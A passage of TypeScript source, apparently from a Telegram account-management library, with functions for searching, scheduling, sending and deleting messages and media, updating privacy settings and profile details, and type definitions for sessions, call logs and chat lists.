(lower.includes(term)) return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    for (const type of types) {\r\n        const filter = getSearchFilter(type);\r\n        const queryFilter = {\r\n            limit: limit || 500,\r\n            ...(maxId ? { maxId } : {}),\r\n            ...(minId ? { minId } : {}),\r\n        };\r\n\r\n        ctx.logger.info(ctx.phoneNumber, type, queryFilter);\r\n        let messages: Api.Message[] = [];\r\n        let count = 0;\r\n\r\n        if (chatId) {\r\n            const peer = await safeGetEntityById(ctx, chatId);\r\n            ctx.logger.info(ctx.phoneNumber, 'Performing search in chat: ', chatId);\r\n            const result = await ctx.client.invoke(new Api.messages.Search({\r\n                peer,\r\n                q: query,\r\n                filter,\r\n                ...queryFilter,\r\n                hash: bigInt(0),\r\n                minDate: 0,\r\n                maxDate: 0,\r\n                addOffset: 0,\r\n                offsetId: 0,\r\n            }));\r\n            if (!('messages' in result)) return finalResult;\r\n            ctx.logger.info(ctx.phoneNumber, `Type: ${type}, Length: ${result?.messages?.length}, count: ${(result as Api.messages.ChannelMessages).count}`);\r\n            count = (result as Api.messages.ChannelMessages).count || 0;\r\n            messages = result.messages as Api.Message[];\r\n        } else {\r\n            ctx.logger.info(ctx.phoneNumber, 'Performing global search');\r\n            const result = await ctx.client.invoke(new Api.messages.SearchGlobal({\r\n                q: query,\r\n                filter,\r\n                ...queryFilter,\r\n                offsetRate: 0,\r\n                offsetPeer: new Api.InputPeerEmpty(),\r\n                offsetId: 0,\r\n            }));\r\n            if (!('messages' in result)) return finalResult;\r\n            ctx.logger.info(ctx.phoneNumber, `Type: ${type}, Length: ${result?.messages?.length}, count: ${(result as Api.messages.ChannelMessages).count}`);\r\n            count = (result as Api.messages.ChannelMessages).count || 0;\r\n            messages = result.messages as Api.Message[];\r\n        }\r\n\r\n        if (types.includes(MessageMediaType.TEXT) && types.length === 1) {\r\n            ctx.logger.info(ctx.phoneNumber, 'Text Filter');\r\n            messages = messages.filter((msg: Api.Message) => !('media' in msg) || !msg.media);\r\n        }\r\n\r\n        const processedMessages = await Promise.all(messages.map(async (message: Api.Message) => {\r\n            if (message.media && message.media instanceof Api.MessageMediaDocument) {\r\n                const document = message.media.document as Api.Document;\r\n                const fileNameAttr = document.attributes.find(attr => attr instanceof Api.DocumentAttributeFilename);\r\n                const fileName = fileNameAttr && fileNameAttr instanceof Api.DocumentAttributeFilename ? fileNameAttr.fileName : '';\r\n                const isWantedFile = !containsUnwanted(fileName);\r\n                return isWantedFile ? message : null;\r\n            } else {\r\n                const messageText = (message.text || '').toLowerCase();\r\n                return !containsUnwanted(messageText) ? message : null;\r\n            }\r\n        }));\r\n\r\n        const filteredMsgs = processedMessages.filter((msg): msg is Api.Message => msg !== null);\r\n        const filteredIds = filteredMsgs.map(m => m.id);\r\n\r\n        // Build enriched data items\r\n        const enrichedData: SearchMessageItem[] = filteredMsgs.map((msg) => {\r\n            let senderName: string | null = null;\r\n            if (msg.fromId instanceof Api.PeerUser) {\r\n                senderName = msg.fromId.userId.toString();\r\n            }\r\n            let mediaType: string | null = null;\r\n            if (msg.media && !(msg.media instanceof Api.MessageMediaEmpty)) {\r\n                mediaType = getMediaType(msg.media);\r\n            }\r\n            let msgChatId = chatId || '';\r\n            if (!msgChatId && msg.peerId) {\r\n                if (msg.peerId instanceof Api.PeerUser) msgChatId = msg.peerId.userId.toString();\r\n                else if (msg.peerId instanceof Api.PeerChat) msgChatId = msg.peerId.chatId.toString();\r\n                else if (msg.peerId instanceof Api.PeerChannel) msgChatId = msg.peerId.channelId.toString();\r\n            }\r\n            return {\r\n                id: msg.id,\r\n                text: msg.message || '',\r\n                date: toISODate(msg.date),\r\n                chatId: msgChatId,\r\n                senderName,\r\n                mediaType,\r\n            };\r\n        });\r\n\r\n        finalResult[`${type}`] = {\r\n            messages: filteredIds,\r\n            total: count ? count : filteredIds.length,\r\n            data: enrichedData,\r\n        };\r\n    }\r\n    return finalResult;\r\n}\r\n\r\nexport async function scheduleMessageSend(ctx: TgContext, opts: MessageScheduleOptions): Promise<Api.Message | Api.TypeUpdates> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const scheduleDate = Math.floor(opts.scheduledTime.getTime() / 1000);\r\n\r\n    if (opts.media) {\r\n        const buffer = await downloadFileFromUrl(opts.media.url);\r\n        const uploadedFile = await ctx.client.uploadFile({\r\n            file: new CustomFile('media', buffer.length, 'media', buffer),\r\n            workers: 1,\r\n        });\r\n\r\n        return ctx.client.sendFile(opts.chatId, {\r\n            file: uploadedFile,\r\n            caption: opts.message,\r\n            forceDocument: opts.media.type === 'document',\r\n            scheduleDate,\r\n        });\r\n    }\r\n\r\n    return ctx.client.sendMessage(opts.chatId, {\r\n        message: opts.message,\r\n        schedule: Math.floor(opts.scheduledTime.getTime() / 1000),\r\n    });\r\n}\r\n\r\nexport async function getScheduledMessages(ctx: TgContext, chatId: string): Promise<ScheduledMessageItem[]> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const result = await ctx.client.invoke(new Api.messages.GetScheduledHistory({\r\n        peer: chatId,\r\n        hash: bigInt(0),\r\n    }));\r\n\r\n    const messages = 'messages' in result && Array.isArray(result.messages)\r\n        ? result.messages.filter((msg): msg is Api.Message => msg instanceof Api.Message)\r\n        : [];\r\n\r\n    return messages.map((msg) => {\r\n        let media = null;\r\n        if (msg.media && !(msg.media instanceof Api.MessageMediaEmpty)) {\r\n            const mediaType = getMediaType(msg.media);\r\n            const meta = extractMediaMetaFromMessage(msg, chatId, mediaType);\r\n            media = {\r\n                type: mediaType,\r\n                thumbnail: null,\r\n                mimeType: meta.mimeType || null,\r\n                fileName: meta.filename || null,\r\n                fileSize: meta.fileSize || null,\r\n                width: meta.width || null,\r\n                height: meta.height || null,\r\n                duration: meta.duration || null,\r\n            };\r\n        }\r\n\r\n        return {\r\n            id: msg.id,\r\n            text: msg.message || '',\r\n            scheduledDate: toISODate(msg.date),\r\n            media,\r\n            chatId,\r\n        };\r\n    });\r\n}\r\n\r\nexport async function sendMediaAlbum(ctx: TgContext, album: MediaAlbumOptions): Promise<AlbumSendResult> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const results: Api.InputSingleMedia[] = [];\r\n    const errors: Array<{ index: number; error: string }> = [];\r\n\r\n    for (let i = 0; i < album.media.length; i++) {\r\n        const item = album.media[i];\r\n        try {\r\n            const buffer = await downloadFileFromUrl(item.url);\r\n            const uploadedFile = await ctx.client.uploadFile({\r\n                file: new CustomFile(\r\n                    item.filename || `media_${i}`,\r\n                    buffer.length,\r\n                    item.filename || `media_${i}`,\r\n                    buffer\r\n                ),\r\n                workers: 1,\r\n            });\r\n\r\n            const media = new Api.InputSingleMedia({\r\n                media: item.type === 'photo'\r\n                    ? new Api.InputMediaUploadedPhoto({ file: uploadedFile })\r\n                    : new Api.InputMediaUploadedDocument({\r\n                        file: uploadedFile,\r\n                        mimeType: item.type === 'video' ? 'video/mp4' : detectContentType(item.filename || `media_${i}`),\r\n                        attributes: item.type === 'video' ? [\r\n                            new Api.DocumentAttributeVideo({\r\n                                supportsStreaming: true,\r\n                                duration: 0,\r\n                                w: 0,\r\n                                h: 0,\r\n                            }),\r\n                        ] : [],\r\n                    }),\r\n                message: item.caption || '',\r\n                entities: [],\r\n            });\r\n            results.push(media);\r\n        } catch (error) {\r\n            ctx.logger.error(ctx.phoneNumber, `Error processing album item ${i}:`, error);\r\n            errors.push({ index: i, error: error.message || 'Unknown error' });\r\n        }\r\n    }\r\n\r\n    if (results.length === 0) {\r\n        throw new Error('No media items could be processed. All items failed.');\r\n    }\r\n\r\n    await ctx.client.invoke(new Api.messages.SendMultiMedia({\r\n        peer: album.chatId,\r\n        multiMedia: results,\r\n    }));\r\n\r\n    return {\r\n        success: results.length,\r\n        failed: errors.length,\r\n        errors: errors.length > 0 ? errors : undefined,\r\n    };\r\n}\r\n\r\nexport async function sendVoiceMessage(ctx: TgContext, voice: VoiceMessageOptions): Promise<Api.TypeUpdates> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    try {\r\n        const buffer = await downloadFileFromUrl(voice.url);\r\n\r\n        return await ctx.client.invoke(new Api.messages.SendMedia({\r\n            peer: voice.chatId,\r\n            media: new Api.InputMediaUploadedDocument({\r\n                file: await ctx.client.uploadFile({\r\n                    file: new CustomFile('voice.ogg', buffer.length, 'voice.ogg', buffer),\r\n                    workers: 1,\r\n                }),\r\n                mimeType: 'audio/ogg',\r\n                attributes: [\r\n                    new Api.DocumentAttributeAudio({\r\n                        voice: true,\r\n                        duration: voice.duration || 0,\r\n                    }),\r\n                ],\r\n            }),\r\n            message: voice.caption || '',\r\n            randomId: bigInt(Math.floor(Math.random() * 1000000000)),\r\n        }));\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Error sending voice message:', error);\r\n        throw error;\r\n    }\r\n}\r\n\r\nexport async function cleanupChat(ctx: TgContext, cleanup: {\r\n    chatId: string;\r\n    beforeDate?: Date;\r\n    onlyMedia?: boolean;\r\n    excludePinned?: boolean;\r\n    revoke?: boolean;\r\n}): Promise<{ deletedCount: number }> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n    cleanup.revoke = cleanup.revoke !== undefined ? cleanup.revoke : true;\r\n\r\n    const messages = await ctx.client.getMessages(cleanup.chatId, {\r\n        limit: 1000,\r\n        ...(cleanup.beforeDate && {\r\n            offsetDate: Math.floor(cleanup.beforeDate.getTime() / 1000),\r\n        }),\r\n    });\r\n\r\n    const toDelete = messages.filter(msg => {\r\n        if (cleanup.excludePinned && msg.pinned) return false;\r\n        if (cleanup.onlyMedia && !msg.media) return false;\r\n        return true;\r\n    });\r\n\r\n    if (toDelete.length > 0) {\r\n        await ctx.client.deleteMessages(cleanup.chatId, toDelete.map(m => m.id), {\r\n            revoke: cleanup.revoke,\r\n        });\r\n    }\r\n\r\n    return { deletedCount: toDelete.length };\r\n}\r\n\r\nexport async function editMessage(ctx: TgContext, options: EditMessageOptions): Promise<Api.TypeUpdates> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    if (options.media) {\r\n        const buffer = await downloadFileFromUrl(options.media.url);\r\n        const file = new CustomFile(\r\n            `media.${getMediaExtension(options.media.type)}`,\r\n            buffer.length,\r\n            'media',\r\n            buffer\r\n        );\r\n\r\n        const uploadedFile = await ctx.client.uploadFile({ file, workers: 1 });\r\n\r\n        const inputMedia = options.media.type === 'photo'\r\n            ? new Api.InputMediaUploadedPhoto({ file: uploadedFile })\r\n            : new Api.InputMediaUploadedDocument({\r\n                file: uploadedFile,\r\n                mimeType: getMimeType(options.media.type),\r\n                attributes: getMediaAttributes(options.media),\r\n            });\r\n\r\n        return ctx.client.invoke(new Api.messages.EditMessage({\r\n            peer: options.chatId,\r\n            id: options.messageId,\r\n            media: inputMedia,\r\n            message: options.text || '',\r\n        }));\r\n    }\r\n\r\n    if (options.text) {\r\n        return ctx.client.invoke(new Api.messages.EditMessage({\r\n            peer: options.chatId,\r\n            id: options.messageId,\r\n            message: options.text,\r\n        }));\r\n    }\r\n\r\n    throw new Error('Either text or media must be provided');\r\n}\r\n\r\nexport async function sendMediaBatch(ctx: TgContext, options: MediaBatchOptions): Promise<Api.TypeUpdates> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const mediaFiles = await Promise.all(\r\n        options.media.map(async (item) => {\r\n            const buffer = await downloadFileFromUrl(item.url);\r\n            const file = new CustomFile(\r\n                item.fileName || `media.${getMediaExtension(item.type)}`,\r\n                buffer.length,\r\n                'media',\r\n                buffer\r\n            );\r\n\r\n            const uploadedFile = await ctx.client.uploadFile({ file, workers: 1 });\r\n\r\n            const inputMedia = item.type === 'photo'\r\n                ? new Api.InputMediaUploadedPhoto({ file: uploadedFile })\r\n                : new Api.InputMediaUploadedDocument({\r\n                    file: uploadedFile,\r\n                    mimeType: getMimeType(item.type),\r\n                    attributes: getMediaAttributes(item),\r\n                });\r\n\r\n            return new Api.InputSingleMedia({\r\n                media: inputMedia,\r\n                message: item.caption || '',\r\n                entities: [],\r\n            });\r\n        })\r\n    );\r\n\r\n    return ctx.client.invoke(new Api.messages.SendMultiMedia({\r\n        peer: options.chatId,\r\n        multiMedia: mediaFiles,\r\n        silent: options.silent,\r\n        scheduleDate: options.scheduleDate,\r\n    }));\r\n}\r\n\r\nexport async function sendViewOnceMedia(\r\n    ctx: TgContext,\r\n    chatId: string,\r\n    buffer: Buffer,\r\n    caption: string = '',\r\n    isVideo?: boolean,\r\n    filename?: string\r\n): Promise<Api.TypeUpdates> {\r\n    if (!ctx.client) throw new Error('Client is not initialized');\r\n\r\n    try {\r\n        const actualFilename = filename || `viewonce_${Date.now()}.${isVideo ? 'mp4' : 'jpg'}`;\r\n        const mimeType = isVideo ? 'video/mp4' : 'image/jpeg';\r\n        const inputFile = await ctx.client.uploadFile({\r\n            file: new CustomFile(actualFilename, buffer.length, actualFilename, buffer),\r\n            workers: 1,\r\n        });\r\n        const result = await ctx.client.invoke(new Api.messages.SendMedia({\r\n            peer: chatId,\r\n            media: isVideo\r\n                ? new Api.InputMediaUploadedDocument({\r\n                    file: inputFile,\r\n                    mimeType,\r\n                    attributes: [\r\n                        new Api.DocumentAttributeVideo({\r\n                            supportsStreaming: true,\r\n                            duration: 0,\r\n                            w: 0,\r\n                            h: 0,\r\n                        }),\r\n                    ],\r\n                    ttlSeconds: 10,\r\n                })\r\n                : new Api.InputMediaUploadedPhoto({\r\n                    file: inputFile,\r\n                    ttlSeconds: 10,\r\n                }),\r\n            message: caption,\r\n            randomId: bigInt(Math.floor(Math.random() * 1000000000)),\r\n        }));\r\n\r\n        ctx.logger.info(ctx.phoneNumber, `Sent view-once ${isVideo ? 'video' : 'photo'} to chat ${chatId}`);\r\n        return result;\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Error sending view-once media:', error);\r\n        throw error;\r\n    }\r\n}\r\n\r\nexport async function sendPhotoChat(ctx: TgContext, id: string, url: string, caption: string, filename: string): Promise<void> {\r\n    if (!ctx.client) throw new Error('Client is not initialized');\r\n\r\n    try {\r\n        const buffer = await downloadFileFromUrl(url);\r\n        const file = new CustomFile(filename, buffer.length, filename, buffer);\r\n        await ctx.client.sendFile(id, { file, caption });\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Error sending photo:', error);\r\n        throw error;\r\n    }\r\n}\r\n\r\nexport async function sendFileChat(ctx: TgContext, id: string, url: string, caption: string, filename: string): Promise<void> {\r\n    if (!ctx.client) throw new Error('Client is not initialized');\r\n\r\n    try {\r\n        const buffer = await downloadFileFromUrl(url);\r\n        const file = new CustomFile(filename, buffer.length, filename, buffer);\r\n        await ctx.client.sendFile(id, { file, caption });\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Error sending file:', error);\r\n        throw error;\r\n    }\r\n}\r\n\r\nexport async function deleteChat(ctx: TgContext, params: {\r\n    peer: string | Api.TypeInputPeer;\r\n    maxId?: number;\r\n    justClear?: boolean;\r\n    revoke?: boolean;\r\n    minDate?: number;\r\n    maxDate?: number;\r\n}): Promise<void> {\r\n    try {\r\n        await ctx.client.invoke(new Api.messages.DeleteHistory(params));\r\n        ctx.logger.info(ctx.phoneNumber, `Dialog with ID ${params.peer} has been deleted.`);\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Failed to delete dialog:', error);\r\n    }\r\n}\r\n","import { Api } from 'telegram';\r\nimport * as fs from 'fs';\r\nimport { CustomFile } from 'telegram/client/uploads';\r\nimport { sleep } from 'telegram/Helpers';\r\nimport { TgContext, PrivacyBatchSettings } from './types';\r\n\r\n// ---- Shared privacy rule setter (parallelized) ----\r\n\r\nasync function setPrivacyRules(\r\n    ctx: TgContext,\r\n    rules: Array<{ key: Api.TypeInputPrivacyKey; rules: Api.TypeInputPrivacyRule[] }>\r\n): Promise<void> {\r\n    await Promise.all(\r\n        rules.map(({ key, rules: privacyRules }) =>\r\n            ctx.client.invoke(new Api.account.SetPrivacy({ key, rules: privacyRules }))\r\n        )\r\n    );\r\n}\r\n\r\nexport async function updatePrivacy(ctx: TgContext): Promise<void> {\r\n    try {\r\n        await setPrivacyRules(ctx, [\r\n            { key: new Api.InputPrivacyKeyPhoneCall(), rules: [new Api.InputPrivacyValueDisallowAll()] },\r\n            { key: new Api.InputPrivacyKeyProfilePhoto(), rules: [new Api.InputPrivacyValueAllowAll()] },\r\n            { key: new Api.InputPrivacyKeyForwards(), rules: [new Api.InputPrivacyValueAllowAll()] },\r\n            { key: new Api.InputPrivacyKeyPhoneNumber(), rules: [new Api.InputPrivacyValueDisallowAll()] },\r\n            { key: new Api.InputPrivacyKeyStatusTimestamp(), rules: [new Api.InputPrivacyValueAllowAll()] },\r\n            { key: new Api.InputPrivacyKeyAbout(), rules: [new Api.InputPrivacyValueAllowAll()] },\r\n        ]);\r\n        ctx.logger.info(ctx.phoneNumber, 'Privacy Updated (all settings)');\r\n    } catch (e) {\r\n        throw e;\r\n    }\r\n}\r\n\r\nexport async function updatePrivacyforDeletedAccount(ctx: TgContext): Promise<void> {\r\n    try {\r\n        await setPrivacyRules(ctx, [\r\n            { key: new Api.InputPrivacyKeyPhoneCall(), rules: [new Api.InputPrivacyValueDisallowAll()] },\r\n            { key: new Api.InputPrivacyKeyProfilePhoto(), rules: [new Api.InputPrivacyValueDisallowAll()] },\r\n            { key: new Api.InputPrivacyKeyPhoneNumber(), rules: [new Api.InputPrivacyValueDisallowAll()] },\r\n            { key: new Api.InputPrivacyKeyStatusTimestamp(), rules: [new Api.InputPrivacyValueAllowAll()] },\r\n            { key: new Api.InputPrivacyKeyAbout(), rules: [new Api.InputPrivacyValueDisallowAll()] },\r\n        ]);\r\n        ctx.logger.info(ctx.phoneNumber, 'Privacy Updated for Deleted Account (all settings)');\r\n    } catch (e) {\r\n        throw e;\r\n    }\r\n}\r\n\r\nexport async function updatePrivacyBatch(ctx: TgContext, settings: PrivacyBatchSettings): Promise<boolean> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const privacyRules: Record<string, Api.TypeInputPrivacyRule[]> = {\r\n        everybody: [new Api.InputPrivacyValueAllowAll()],\r\n        contacts: [new Api.InputPrivacyValueAllowContacts()],\r\n        nobody: [new Api.InputPrivacyValueDisallowAll()],\r\n    };\r\n\r\n    const privacyMap: Record<string, new () => Api.TypeInputPrivacyKey> = {\r\n        phoneNumber: Api.InputPrivacyKeyPhoneNumber,\r\n        lastSeen: Api.InputPrivacyKeyStatusTimestamp,\r\n        profilePhotos: Api.InputPrivacyKeyProfilePhoto,\r\n        forwards: Api.InputPrivacyKeyForwards,\r\n        calls: Api.InputPrivacyKeyPhoneCall,\r\n        groups: Api.InputPrivacyKeyChatInvite,\r\n    };\r\n\r\n    const updates: Promise<Api.account.PrivacyRules>[] = [];\r\n\r\n    for (const [key, value] of Object.entries(settings)) {\r\n        if (value && key in privacyMap) {\r\n            updates.push(ctx.client.invoke(new Api.account.SetPrivacy({\r\n                key: new privacyMap[key](),\r\n                rules: privacyRules[value],\r\n            })));\r\n        }\r\n    }\r\n\r\n    await Promise.all(updates);\r\n    return true;\r\n}\r\n\r\nexport async function updateProfile(ctx: TgContext, firstName: string, about: string): Promise<void> {\r\n    const data: Record<string, string> = { lastName: '' };\r\n    if (firstName !== undefined) data['firstName'] = firstName;\r\n    if (about !== undefined) data['about'] = about;\r\n\r\n    try {\r\n        await ctx.client.invoke(new Api.account.UpdateProfile(data));\r\n        ctx.logger.info(ctx.phoneNumber, 'Updated Name: ', firstName);\r\n    } catch (error) {\r\n        throw error;\r\n    }\r\n}\r\n\r\nexport async function updateUsername(ctx: TgContext, baseUsername: string): Promise<string> {\r\n    let newUserName = '';\r\n    let username = (baseUsername && baseUsername !== '') ? baseUsername : '';\r\n    let increment = 0;\r\n\r\n    if (username === '') {\r\n        try {\r\n            await ctx.client.invoke(new Api.account.UpdateUsername({ username }));\r\n            ctx.logger.info(ctx.phoneNumber, `Removed Username successfully.`);\r\n        } catch (error) {\r\n            ctx.logger.info(ctx.phoneNumber, error);\r\n        }\r\n    } else {\r\n        while (increment < 10) {\r\n            try {\r\n                const result = await ctx.client.invoke(new Api.account.CheckUsername({ username }));\r\n                ctx.logger.info(ctx.phoneNumber, `Available: ${result} (${username})`);\r\n                if (result) {\r\n                    await ctx.client.invoke(new Api.account.UpdateUsername({ username }));\r\n                    ctx.logger.info(ctx.phoneNumber, `Username '${username}' updated successfully.`);\r\n                    newUserName = username;\r\n                    break;\r\n                } else {\r\n                    if (increment >= 6) {\r\n                        const randomNums = Math.floor(Math.random() * 90 + 10);\r\n                        username = baseUsername + randomNums;\r\n                    } else {\r\n                        username = baseUsername + increment;\r\n                    }\r\n                    increment++;\r\n                    await sleep(2000);\r\n                }\r\n            } catch (error) {\r\n                ctx.logger.info(ctx.phoneNumber, error.message);\r\n                if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {\r\n                    newUserName = username;\r\n                    break;\r\n                }\r\n                if (increment >= 6) {\r\n                    const randomChars = Math.random().toString(36).substring(2, 6);\r\n                    username = baseUsername + randomChars;\r\n                } else {\r\n                    username = baseUsername + increment;\r\n                }\r\n                increment++;\r\n                await sleep(2000);\r\n            }\r\n        }\r\n    }\r\n    return newUserName;\r\n}\r\n\r\nexport async function updateProfilePic(ctx: TgContext, image: string): Promise<void> {\r\n    try {\r\n        const file = await ctx.client.uploadFile({\r\n            file: new CustomFile('pic.jpg', fs.statSync(image).size, image),\r\n            workers: 1,\r\n        });\r\n        ctx.logger.info(ctx.phoneNumber, 'file uploaded');\r\n        await ctx.client.invoke(new Api.photos.UploadProfilePhoto({ file }));\r\n        ctx.logger.info(ctx.phoneNumber, 'profile pic updated');\r\n    } catch (error) {\r\n        throw error;\r\n    }\r\n}\r\n\r\nexport async function downloadProfilePic(ctx: TgContext, photoIndex: number): Promise<string | undefined> {\r\n    try {\r\n        const photos = await ctx.client.invoke(new Api.photos.GetUserPhotos({ userId: 'me', offset: 0 }));\r\n\r\n        if (photos.photos.length > 0) {\r\n            ctx.logger.info(ctx.phoneNumber, `You have ${photos.photos.length} profile photos.`);\r\n            if (photoIndex < photos.photos.length) {\r\n                const selectedPhoto = <Api.Photo>photos.photos[photoIndex];\r\n                const index = Math.max(selectedPhoto.sizes.length - 2, 0);\r\n                const photoFileSize = selectedPhoto.sizes[index];\r\n\r\n                const photoBuffer = await ctx.client.downloadFile(\r\n                    new Api.InputPhotoFileLocation({\r\n                        id: selectedPhoto.id,\r\n                        accessHash: selectedPhoto.accessHash,\r\n                        fileReference: selectedPhoto.fileReference,\r\n                        thumbSize: photoFileSize.type,\r\n                    }),\r\n                    { dcId: selectedPhoto.dcId }\r\n                );\r\n\r\n                if (photoBuffer) {\r\n                    const outputPath = `profile_picture_${photoIndex + 1}.jpg`;\r\n                    fs.writeFileSync(outputPath, photoBuffer);\r\n                    ctx.logger.info(ctx.phoneNumber, `Profile picture downloaded as '${outputPath}'`);\r\n                    return outputPath;\r\n                } else {\r\n                    ctx.logger.info(ctx.phoneNumber, 'Failed to download the photo.');\r\n                }\r\n            } else {\r\n                ctx.logger.info(ctx.phoneNumber, `Photo index ${photoIndex} is out of range.`);\r\n            }\r\n        } else {\r\n            ctx.logger.info(ctx.phoneNumber, 'No profile photos found.');\r\n        }\r\n    } catch (err) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Error:', err);\r\n    }\r\n    return undefined;\r\n}\r\n\r\nexport async function deleteProfilePhotos(ctx: TgContext): Promise<void> {\r\n    try {\r\n        const result = await ctx.client.invoke(new Api.photos.GetUserPhotos({ userId: 'me' }));\r\n        ctx.logger.info(ctx.phoneNumber, `Profile Pics found: ${result.photos.length}`);\r\n        if (result && result.photos?.length > 0) {\r\n            await ctx.client.invoke(\r\n                new Api.photos.DeletePhotos({\r\n                    id: <Api.TypeInputPhoto[]><unknown>result.photos,\r\n                })\r\n            );\r\n        }\r\n        ctx.logger.info(ctx.phoneNumber, 'Deleted profile Photos');\r\n    } catch (error) {\r\n        throw error;\r\n    }\r\n}\r\n","import { TelegramClient } from 'telegram';\r\nimport { Api } from 'telegram';\r\nimport { TelegramLogger } from '../utils/telegram-logger';\r\nimport bigInt from 'big-integer';\r\n\r\n// Core context passed to all operations\r\nexport interface TgContext {\r\n    client: TelegramClient;\r\n    phoneNumber: string;\r\n    logger: TelegramLogger;\r\n}\r\n\r\n// ---- Static class types ----\r\n\r\nexport interface ActiveClientSetup {\r\n    days?: number;\r\n    archiveOld: boolean;\r\n    formalities: boolean;\r\n    newMobile: string;\r\n    existingMobile: string;\r\n    clientId: string;\r\n}\r\n\r\n// ---- Return types for every domain ----\r\n\r\nexport interface GroupCreationResult {\r\n    id: bigInt.BigInteger;\r\n    accessHash: bigInt.BigInteger;\r\n}\r\n\r\nexport interface ForwardResult {\r\n    forwardedCount: number;\r\n}\r\n\r\nexport interface CallLogEntry {\r\n    messageId: number;\r\n    date: number;\r\n    durationSeconds: number;\r\n    video: boolean;\r\n    outgoing: boolean;\r\n}\r\n\r\nexport interface CallLogChat {\r\n    chatId: string;\r\n    phone?: string;\r\n    username?: string;\r\n    name: string;\r\n    peerType: 'user' | 'group' | 'channel';\r\n    calls: {\r\n        total: number;\r\n        outgoing: number;\r\n        incoming: number;\r\n        video: number;\r\n        audio: number;\r\n    };\r\n    totalMessages?: number;\r\n    photoCount?: number;\r\n    videoCount?: number;\r\n    /** Present only when requested via includeCallLog option */\r\n    callLog?: CallLogEntry[];\r\n}\r\n\r\nexport interface CallLogResult {\r\n    totalCalls: number;\r\n    outgoing: number;\r\n    incoming: number;\r\n    video: number;\r\n    audio: number;\r\n    chats: CallLogChat[];\r\n}\r\n\r\nexport interface SelfMessagesInfo {\r\n    photoCount: number;\r\n    videoCount: number;\r\n    movieCount: number;\r\n    total: number;\r\n    ownPhotoCount: number;\r\n    otherPhotoCount: number;\r\n    ownVideoCount: number;\r\n    otherVideoCount: number;\r\n    analyzedMessages: number;\r\n}\r\n\r\nexport interface MediaMetadataItem {\r\n    messageId: number;\r\n    chatId: string;\r\n    type: string;\r\n    date: number;\r\n    caption: string;\r\n    fileSize?: number;\r\n    mimeType?: string;\r\n    filename?: string;\r\n    width?: number;\r\n    height?: number;\r\n    duration?: number;\r\n}\r\n\r\nexport interface FilteredMediaItem extends MediaMetadataItem {\r\n    thumbnail?: string;\r\n    mediaDetails?: DocumentMediaDetails;\r\n}\r\n\r\nexport interface DocumentMediaDetails {\r\n    size: bigInt.BigInteger | number;\r\n    mimeType: string;\r\n    fileName: string | null;\r\n    duration: number | null;\r\n    width: number | null;\r\n    height: number | null;\r\n}\r\n\r\nexport interface PaginationInfo {\r\n    page: number;\r\n    limit: number;\r\n    total: number;\r\n    totalPages: number;\r\n    hasMore: boolean;\r\n    nextMaxId?: number;\r\n    prevMaxId?: number;\r\n    firstMessageId?: number;\r\n    lastMessageId?: number;\r\n}\r\n\r\nexport interface MediaGroupResult {\r\n    type: string;\r\n    count: number;\r\n    items: MediaMetadataItem[];\r\n    pagination: PaginationInfo;\r\n}\r\n\r\nexport interface MediaListResponse {\r\n    data?: MediaMetadataItem[];\r\n    groups?: MediaGroupResult[];\r\n    pagination: PaginationInfo;\r\n    filters: MediaFilterInfo;\r\n}\r\n\r\nexport interface FilteredMediaListResponse {\r\n    data?: FilteredMediaItem[];\r\n    groups?: FilteredMediaGroupResult[];\r\n    pagination: PaginationInfo;\r\n    filters: MediaFilterInfo;\r\n}\r\n\r\nexport interface FilteredMediaGroupResult {\r\n    type: string;\r\n    count: number;\r\n    items: FilteredMediaItem[];\r\n    pagination: PaginationInfo;\r\n}\r\n\r\nexport interface MediaFilterInfo {\r\n    chatId: string;\r\n    types: string[];\r\n    startDate?: string;\r\n    endDate?: string;\r\n}\r\n\r\nexport interface ThumbnailResult {\r\n    buffer: Buffer;\r\n    etag: string;\r\n    contentType: string;\r\n    filename: string;\r\n}\r\n\r\nexport interface MediaFileDownloadInfo {\r\n    fileLocation: Api.TypeInputFileLocation;\r\n    contentType: string;\r\n    filename: string;\r\n    fileSize: number;\r\n    etag: string;\r\n    inputLocation: Api.Photo | Api.Document;\r\n}\r\n\r\nexport interface MediaFileInfo {\r\n    contentType: string;\r\n    filename: string;\r\n    fileLocation: Api.TypeInputFileLocation;\r\n    fileSize: number;\r\n    inputLocation: Api.Photo | Api.Document;\r\n}\r\n\r\nexport interface SessionInfo {\r\n    sessions: AppSession[];\r\n    webSessions: WebSession[];\r\n}\r\n\r\nexport interface AppSession {\r\n    hash: string;\r\n    deviceModel: string;\r\n    platform: string;\r\n    systemVersion: string;\r\n    appName: string;\r\n    dateCreated: Date;\r\n    dateActive: Date;\r\n    ip: string;\r\n    country: string;\r\n    region: string;\r\n}\r\n\r\nexport interface WebSession {\r\n    hash: string;\r\n    domain: string;\r\n    browser: string;\r\n    platform: string;\r\n    dateCreated: Date;\r\n    dateActive: Date;\r\n    ip: string;\r\n    region: string;\r\n}\r\n\r\nexport interface ChatListItem {\r\n    id: string;\r\n    title: string | null;\r\n    username: string | null;\r\n    type: 'user' | 'group' | 'channel' | 'unknown';\r\n    unreadCount: number;\r\n    lastMessage: { id: number; text: string; date: string; senderName: string | null } | null;\r\n    photoBase64: string | null;\r\n    onlineStatus: string | null;\r\n    lastSeen: string | null;\r\n    isMuted: boolean;\r\n    participantCount: number | null;\r\n}\r\n\r\nexport interface ChatListResult {\r\n    items: ChatListItem[];\r\n    hasMore: boolean;\r\n    nextOffsetDate?: number;\r\n}\r\n\r\nexport interface GroupMember {\r\n    tgId: bigInt.BigInteger;\r\n    name: string;\r\n    username: string;\r\n}\r\n\r\nexport 